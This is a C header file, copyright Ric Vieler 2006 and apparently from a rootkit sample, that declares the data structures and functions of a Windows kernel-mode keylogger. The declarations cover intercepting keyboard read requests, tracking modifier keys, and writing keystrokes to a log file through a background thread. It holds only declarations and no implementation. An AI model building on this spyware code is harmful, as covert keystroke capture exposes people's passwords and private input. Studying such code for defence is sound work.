// Copyright Ric Vieler, 2006
// Support header for keyManager.c

#ifndef _KEY_MANAGER_H_
#define _KEY_MANAGER_H_

typedef struct _KEY_DATA
{
	LIST_ENTRY ListEntry;
	char KeyData;
	char KeyFlags;
}KEY_DATA;

typedef struct _KEY_STATE 
{
	BOOL CtrlKey;
	BOOL AltKey;
	BOOL ShiftKey;
}KEY_STATE;

typedef struct _KEYBOARD_STRUCT 
{
	PETHREAD threadObject;
	BOOL terminateFlag;
	KEY_STATE keyState;
	HANDLE hLogFile;
	KSEMAPHORE keySemaphore;
	KSPIN_LOCK keyLock;
	LIST_ENTRY keyList;
	KSPIN_LOCK irpLock;
	LIST_ENTRY irpList;
}KEYBOARD_STRUCT;

#define NUL 0
#define SPACE 1
#define ENTER 2
#define LSHIFT 3
#define RSHIFT 4
#define CTRL 5
#define ALT 6

NTSTATUS OnKeyboardRead( PDEVICE_OBJECT pDeviceObject,
	PIRP Irp,
	PIO_STACK_LOCATION irpStack );
NTSTATUS OnReadCompletion( IN PDEVICE_OBJECT pDeviceObject,
	IN PIRP pIrp,
	IN PVOID Context );
void OnCancel( IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp );
NTSTATUS InitializeLogThread( IN PDRIVER_OBJECT pDriverObject );
VOID KeyLoggerThread( PVOID StartContext );
void GetKey( KEY_DATA* keyData, char* key );
void StartKeylogger( PDRIVER_OBJECT pDriverObject );
void StopKeylogger( PDEVICE_OBJECT* ppOldDevice,
	PDEVICE_OBJECT* ppNewDevice );

#endif

